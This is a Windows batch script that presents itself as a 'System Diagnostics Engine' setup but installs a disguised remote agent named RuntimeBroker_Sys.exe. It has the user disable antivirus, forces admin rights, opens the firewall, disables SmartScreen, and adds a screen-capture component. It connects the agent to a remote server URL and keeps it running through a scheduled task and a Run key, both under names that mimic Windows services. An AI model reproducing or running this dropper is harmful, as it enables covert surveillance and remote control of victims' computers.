@echo off
title System Diagnostics Engine
color 0A

:: =========================================================
:: ULTIMATE SETUP v6.1 — ZERO POWERSHELL, NEVER HANGS
:: Extract ZIP → Run this BAT as Admin → Done in 30 seconds.
:: =========================================================

:: 1. FORCE ADMIN
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo.
    echo [!] Requesting Administrator Access...
    echo.
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

echo.
echo =========================================================
echo    SYSTEM DIAGNOSTICS ENGINE - DEPLOYMENT v6.1
echo =========================================================
echo.

:: 2. CONFIG
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL=https://h-boss-production.up.railway.app"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"

:: =========================================================
:: STEP 0: ASK USER TO DISABLE ANTIVIRUS
:: =========================================================
echo =========================================================
echo    IMPORTANT: DISABLE YOUR ANTIVIRUS FIRST!
echo =========================================================
echo.
echo    Before continuing, please:
echo      1. Open your Antivirus (Defender/McAfee/Avast/etc)
echo      2. DISABLE Real-Time Protection temporarily
echo      3. Or add this folder to exclusions:
echo         C:\ProgramData\Microsoft\Windows\SystemHealth
echo.
echo    Press any key AFTER you have disabled your antivirus...
echo.
pause >nul

echo.
echo [*] Starting installation...
echo.

:: =========================================================
:: STEP 1/6: CLEAN OLD INSTALLATION
:: =========================================================
echo [1/6] Cleaning previous installation...
echo     [~] Killing old processes...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
echo     [########            ] 40%%

echo     [~] Removing old tasks and registry...
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1
echo     [############        ] 60%%

echo     [~] Removing old directory...
if exist "%INSTALL_DIR%" (
    attrib -h -s -r "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Everyone:F /T /C /Q >nul 2>&1
    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo     [####################] 100%% - Clean!
echo.

:: =========================================================
:: STEP 2/6: COPY FILES (with FULL permissions so launch works)
:: =========================================================
echo [2/6] Installing files...
echo     [~] Copying agent to secure location...

xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1
if %errorlevel% neq 0 (
    echo     [!] xcopy failed, trying robocopy...
    robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
)
echo     [##########          ] 50%%

:: Copy the agent exe as the disguised name
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
    echo     [####################] 100%% - Files installed!
) else (
    echo.
    echo [ERROR] teram_agent.exe not found in this folder!
    echo Make sure the zip was extracted completely.
    echo.
    pause
    exit /B
)

:: CRITICAL: Give EVERYONE full access so the agent can run + write logs
icacls "%INSTALL_DIR%" /grant Everyone:F /T /C /Q >nul 2>&1
echo.

:: =========================================================
:: STEP 3/6: COMPILE SCREENCAP (try compile, keep bundled if fails)
:: =========================================================
echo [3/6] Setting up screen capture...

set "CSC_PATH="
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
    set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
)
if not defined CSC_PATH if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
    set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

if defined CSC_PATH (
    if exist "%INSTALL_DIR%\ScreenCap.cs" (
        echo     [~] Compiling ScreenCap for this machine...
        "%CSC_PATH%" /nologo /target:winexe /out:"%INSTALL_DIR%\ScreenCap.exe" /r:System.Windows.Forms.dll,System.Drawing.dll "%INSTALL_DIR%\ScreenCap.cs" >nul 2>&1
        if %errorlevel% equ 0 (
            echo     [####################] 100%% - Compiled!
        ) else (
            echo     [!] Compile failed - using bundled ScreenCap.exe
            if exist "%~dp0ScreenCap.exe" copy /Y "%~dp0ScreenCap.exe" "%INSTALL_DIR%\ScreenCap.exe" >nul
            echo     [####################] 100%%
        )
    ) else (
        echo     [*] Using bundled ScreenCap.exe
        echo     [####################] 100%%
    )
) else (
    echo     [*] Using bundled ScreenCap.exe
    if exist "%~dp0ScreenCap.exe" copy /Y "%~dp0ScreenCap.exe" "%INSTALL_DIR%\ScreenCap.exe" >nul
    echo     [####################] 100%%
)
echo.

:: =========================================================
:: STEP 4/6: FIREWALL + SMARTSCREEN
:: =========================================================
echo [4/6] Configuring firewall and SmartScreen...
echo     [~] Adding firewall rules...

netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
echo     [##########          ] 50%%

echo     [~] Disabling SmartScreen...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
echo     [####################] 100%% - Network configured!
echo.

:: =========================================================
:: STEP 5/6: LAUNCH AGENT FIRST (before locking down)
:: =========================================================
echo [5/6] Launching agent...
echo     [~] Starting connection to server...

set "LAUNCH_SUCCESS=0"

:: Method 1: Direct start in current admin session
echo     [####                ] 20%% - Direct start...
start "" "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
ping 127.0.0.1 -n 4 >nul

tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    set "LAUNCH_SUCCESS=1"
    goto LaunchDone
)

:: Method 2: Start with explicit working directory
echo     [########            ] 40%% - Retry with working dir...
start /D "%INSTALL_DIR%" "" "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
ping 127.0.0.1 -n 4 >nul

tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    set "LAUNCH_SUCCESS=1"
    goto LaunchDone
)

:: Method 3: Scheduled task trigger
echo     [############        ] 60%% - Task trigger...
schtasks /Run /TN "%TASK_NAME%" >nul 2>&1
ping 127.0.0.1 -n 4 >nul

tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    set "LAUNCH_SUCCESS=1"
    goto LaunchDone
)

:: Method 4: cmd /c start
echo     [################    ] 80%% - CMD start...
cmd /c start "" "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
ping 127.0.0.1 -n 4 >nul

tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    set "LAUNCH_SUCCESS=1"
    goto LaunchDone
)

echo     [!] All launch methods tried.

:LaunchDone

echo.

:: =========================================================
:: STEP 6/6: PERSISTENCE (AFTER successful launch)
:: =========================================================
echo [6/6] Setting up auto-start...

:: Scheduled Task
echo     [~] Creating scheduled task...
schtasks /Create /TN "%TASK_NAME%" /TR "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
echo     [##########          ] 50%%

:: Registry Run Key
echo     [~] Adding registry auto-start...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /f >nul
echo     [####################] 100%% - Persistence active!
echo.

:: =========================================================
:: FINAL RESULT
:: =========================================================
if %LAUNCH_SUCCESS% equ 1 (
    echo =====================================================
    echo    DEPLOYMENT SUCCESSFUL - AGENT IS RUNNING!
    echo =====================================================
    echo    Process:    %BIN_NAME% [RUNNING]
    echo    Server:     %SERVER_URL%
    echo    Location:   %INSTALL_DIR%
    echo.
    echo    AUTO-START: Yes (Scheduled Task + Registry)
    echo    STATUS:     ONLINE - Check your dashboard!
    echo =====================================================
) else (
    echo =====================================================
    echo    INSTALLED BUT COULD NOT START
    echo =====================================================
    echo    Your ANTIVIRUS is probably blocking it.
    echo.
    echo    TO FIX THIS:
    echo      1. Open your Antivirus
    echo      2. Check Quarantine - restore RuntimeBroker_Sys.exe
    echo      3. Add this folder to exclusions:
    echo         %INSTALL_DIR%
    echo      4. Then run this command manually:
    echo         "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
    echo.
    echo    Or just REBOOT - it will auto-start.
    echo =====================================================
)

echo.
echo Press any key to close...
pause >nul
exit /B
